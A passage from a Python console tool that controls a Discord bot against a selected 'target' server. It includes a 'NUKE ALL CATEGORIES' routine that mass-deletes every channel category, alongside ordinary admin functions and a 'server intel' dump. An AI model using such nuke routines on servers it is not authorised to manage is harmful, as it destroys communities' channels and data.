        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    cat_name = await async_input(f"{Fore.WHITE}Category name: {Style.RESET_ALL}")
    # coded by github.com/leoniofficials
    try:
        category = await guild.create_category(cat_name)
        print(f"{Fore.GREEN}[✓] Category '{cat_name}' created (ID: {category.id}){Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")
# coded by github.com/leoniofficials
async def delete_all_categories():
    if not guild:
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    print(f"{Fore.RED}{Style.BRIGHT}")
    print("    ⚠ ═══════════════════════════════════════════ ⚠")
    print("    ║  WARNING: NUKE ALL CATEGORIES              ║")
    print("    ║  THIS WILL DELETE ALL CATEGORIES           ║")
    print("    ⚠ ═══════════════════════════════════════════ ⚠")
    print(f"{Style.RESET_ALL}")
    onay = await async_input(f"{Fore.RED}Type 'NUKE' to confirm: {Style.RESET_ALL}")
    # coded by github.com/leoniofficials
    if onay.upper() != "NUKE":
        return
    # coded by github.com/leoniofficials
    print(f"{Fore.RED}{Style.BRIGHT}[☢] NUKING CATEGORIES...{Style.RESET_ALL}")
    deleted = 0
    for category in list(guild.categories):
        try:
            await category.delete()
            deleted += 1
            print(f"{Fore.RED}[×] {category.name} obliterated ({deleted}){Style.RESET_ALL}")
            await asyncio.sleep(0.5)
        except Exception as e:
            print(f"{Fore.YELLOW}[!] {category.name} protected{Style.RESET_ALL}")
    print(f"{Fore.RED}{Style.BRIGHT}[☢] CATEGORY NUKE COMPLETE - {deleted} DESTROYED{Style.RESET_ALL}")
# coded by github.com/leoniofficials
async def change_banner():
    if not guild:
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    
    if "BANNER" not in guild.features:
        print(f"{Fore.RED}[✗] Server doesn't have banner feature (needs boost level 2){Style.RESET_ALL}")
        return
    # coded by github.com/leoniofficials
    banner_path = await async_input(f"{Fore.WHITE}Banner file path (or 'remove'): {Style.RESET_ALL}")
    # coded by github.com/leoniofficials
    try:
        if banner_path.lower() == 'remove':
            await guild.edit(banner=None)
            print(f"{Fore.GREEN}[✓] Banner removed{Style.RESET_ALL}")
        else:
            with open(banner_path, 'rb') as f:
                banner_data = f.read()
            await guild.edit(banner=banner_data)
            print(f"{Fore.GREEN}[✓] Banner changed{Style.RESET_ALL}")
    except FileNotFoundError:
        print(f"{Fore.RED}[✗] File not found{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")

async def set_afk_channel():
    if not guild:
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    
    if not guild.voice_channels:
        print(f"{Fore.RED}[✗] No voice channels available{Style.RESET_ALL}")
        return
    # coded by github.com/leoniofficials
    print(f"{Fore.CYAN}Voice channels:{Style.RESET_ALL}")
    for i, vc in enumerate(guild.voice_channels, 1):
        print(f"{Fore.GREEN}[{i}]{Fore.WHITE} {vc.name}")
    
    choice = await async_input(f"{Fore.WHITE}Channel number (0 = remove AFK): {Style.RESET_ALL}")
    
    try:
        choice_num = int(choice)
        if choice_num == 0:
            await guild.edit(afk_channel=None)
            print(f"{Fore.GREEN}[✓] AFK channel removed{Style.RESET_ALL}")
        elif 1 <= choice_num <= len(guild.voice_channels):
            vc = guild.voice_channels[choice_num - 1]
            await guild.edit(afk_channel=vc)
            print(f"{Fore.GREEN}[✓] AFK channel set to {vc.name}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Invalid selection{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")
# coded by github.com/leoniofficials
async def set_rules_channel():
    if not guild:
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    
    if not guild.text_channels:
        print(f"{Fore.RED}[✗] No text channels available{Style.RESET_ALL}")
        return
    
    print(f"{Fore.CYAN}Text channels:{Style.RESET_ALL}")
    for i, tc in enumerate(guild.text_channels, 1):
        print(f"{Fore.GREEN}[{i}]{Fore.WHITE} {tc.name}")
    # coded by github.com/leoniofficials
    choice = await async_input(f"{Fore.WHITE}Channel number (0 = remove): {Style.RESET_ALL}")
    
    try:
        choice_num = int(choice)
        if choice_num == 0:
            await guild.edit(rules_channel=None)
            print(f"{Fore.GREEN}[✓] Rules channel removed{Style.RESET_ALL}")
        elif 1 <= choice_num <= len(guild.text_channels):
            tc = guild.text_channels[choice_num - 1]
            await guild.edit(rules_channel=tc)
            print(f"{Fore.GREEN}[✓] Rules channel set to {tc.name}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Invalid selection{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")
# coded by github.com/leoniofficials
async def set_modlog_channel():
    if not guild:
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    
    if not guild.text_channels:
        print(f"{Fore.RED}[✗] No text channels available{Style.RESET_ALL}")
        return
    # coded by github.com/leoniofficials
    print(f"{Fore.CYAN}Text channels:{Style.RESET_ALL}")
    for i, tc in enumerate(guild.text_channels, 1):
        print(f"{Fore.GREEN}[{i}]{Fore.WHITE} {tc.name}")
    
    choice = await async_input(f"{Fore.WHITE}Channel number (0 = remove): {Style.RESET_ALL}")
    
    try:
        choice_num = int(choice)
        if choice_num == 0:
            await guild.edit(public_updates_channel=None)
            print(f"{Fore.GREEN}[✓] Mod log channel removed{Style.RESET_ALL}")
        elif 1 <= choice_num <= len(guild.text_channels):
            tc = guild.text_channels[choice_num - 1]
            await guild.edit(public_updates_channel=tc)
            print(f"{Fore.GREEN}[✓] Mod log set to {tc.name}{Style.RESET_ALL}")
        else:
            print(f"{Fore.RED}[✗] Invalid selection{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Error: {e}{Style.RESET_ALL}")
# coded by github.com/leoniofficials
async def boost_info():
    if not guild:
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.MAGENTA}╔{'═'*50}╗")
    print(f"║{' '*15}BOOST INFORMATION{' '*17}║")
    print(f"╚{'═'*50}╝{Style.RESET_ALL}\n")
    
    print(f"{Fore.CYAN}Server:{Fore.WHITE} {guild.name}")
    print(f"{Fore.CYAN}Boost Level:{Fore.WHITE} {guild.premium_tier}")
    print(f"{Fore.CYAN}Boost Count:{Fore.WHITE} {guild.premium_subscription_count}")
    print(f"{Fore.CYAN}Boosters:{Fore.WHITE} {len(guild.premium_subscribers)}")
    
    if guild.premium_subscribers:
        print(f"\n{Fore.MAGENTA}Top Boosters:{Style.RESET_ALL}")
        for i, booster in enumerate(guild.premium_subscribers[:10], 1):
            print(f"{Fore.GREEN}  [{i}]{Fore.WHITE} {booster}")
# coded by github.com/leoniofficials
async def detailed_server_info():
    if not guild:
        print(f"{Fore.RED}[✗] No target selected{Style.RESET_ALL}")
        return
    
    print(f"\n{Fore.CYAN}╔{'═'*60}╗")
    print(f"║{' '*20}SERVER INTEL{' '*28}║")
    print(f"╚{'═'*60}╝{Style.RESET_ALL}\n")
    # coded by github.com/leoniofficials
    print(f"{Fore.YELLOW}[●] BASIC INFO{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Name:{Fore.WHITE} {guild.name}")
    print(f"  {Fore.CYAN}ID:{Fore.WHITE} {guild.id}")
    print(f"  {Fore.CYAN}Owner:{Fore.WHITE} {guild.owner}")
    print(f"  {Fore.CYAN}Created:{Fore.WHITE} {guild.created_at.strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  {Fore.CYAN}Region:{Fore.WHITE} {guild.preferred_locale}")
    # coded by github.com/leoniofficials
    print(f"\n{Fore.YELLOW}[●] STATISTICS{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Members:{Fore.WHITE} {guild.member_count}")
    print(f"  {Fore.CYAN}Roles:{Fore.WHITE} {len(guild.roles)}")
    print(f"  {Fore.CYAN}Text Channels:{Fore.WHITE} {len(guild.text_channels)}")
    print(f"  {Fore.CYAN}Voice Channels:{Fore.WHITE} {len(guild.voice_channels)}")
    print(f"  {Fore.CYAN}Categories:{Fore.WHITE} {len(guild.categories)}")
    print(f"  {Fore.CYAN}Emojis:{Fore.WHITE} {len(guild.emojis)}")
    # coded by github.com/leoniofficials
    print(f"\n{Fore.YELLOW}[●] BOOST STATUS{Style.RESET_ALL}")
    print(f"  {Fore.CYAN}Level:{Fore.WHITE} {guild.premium_tier}")
    print(f"  {Fore.CYAN}Boosts:{Fore.WHITE} {guild.premium_subscription_count}")
    # coded by github.com/leoniofficials
    print(f"\n{Fore.YELLOW}[●] FEATURES{Style.RESET_ALL}")
    if guild.features:
        for feature in guild.features:
            print(f"  {Fore.GREEN}✓{Fore.WHITE} {feature}")
    else:
        print(f"  {Fore.RED}No special features{Style.RESET_ALL}")
# coded by github.com/leoniofficials
@bot.event
async def on_ready():
    global guild
    print_header()
    print(f"{Fore.GREEN}[✓] {Fore.WHITE}Bot connected: {Fore.CYAN}{bot.user}{Style.RESET_ALL}")
    # coded by github.com/leoniofficials
    
    if len(bot.guilds) == 1:
        guild = bot.guilds[0]
        print(f"{Fore.GREEN}[✓] {Fore.WHITE}Auto-selected: {Fore.YELLOW}{guild.name}{Style.RESET_ALL}")
        time.sleep(1)
    elif len(bot.guilds) > 1:
        # coded by github.com/leoniofficials
        await select_guild()
    else:
        print(f"{Fore.RED}[✗] {Fore.WHITE}Bot is not in any server! Add bot to a server first.{Style.RESET_ALL}")
        sys.exit(1)
    # coded by github.com/leoniofficials
    await main_menu()
# coded by github.com/leoniofficials
if __name__ == "__main__":
    token = input(f"{Fore.CYAN}Enter bot token: {Style.RESET_ALL}")
    try:
        bot.run(token)
    except discord.LoginFailure:
        print(f"{Fore.RED}[✗] Invalid token!{Style.RESET_ALL}")
    except Exception as e:
        print(f"{Fore.RED}[✗] Connection failed: {e}{Style.RESET_ALL}")
        # coded by github.com/leoniofficials
